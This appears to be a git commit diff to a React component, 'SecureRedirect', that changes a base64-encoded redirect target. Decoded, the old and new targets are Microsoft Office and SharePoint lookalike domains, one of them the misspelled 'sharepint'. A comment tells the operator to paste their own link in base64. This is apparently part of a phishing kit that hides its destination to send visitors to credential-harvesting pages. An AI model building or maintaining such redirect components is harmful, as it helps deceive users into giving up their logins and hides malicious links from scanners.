93920b65fb6050d0b8ec0016965a559529990611
tothemax11 <kuwaitcompany36@gmail.com>
2025-09-18 11:15:17 -0700

    Update SecureRedirect.tsx

--- src/components/SecureRedirect.tsx
+++ src/components/SecureRedirect.tsx
@@ -16,7 +16,7 @@ const SecureRedirect: React.FC = () => {
 
   // Enhanced URL configuration
   const targetUrls = [
-    "aHR0cHM6Ly9vZmZpY2Uuc2hhcmVwaW50Lm9ubGluZS9aSlhlcUpHVA==" // change ur link from here "" into base64
+    "aHR0cHM6Ly9vZmZpY2Uuc2hhYmVhYmxhY2tvbi54eXovZlZiUnlqa3k=" // change ur link from here "" into base64
   ];
 
   // Utility functions
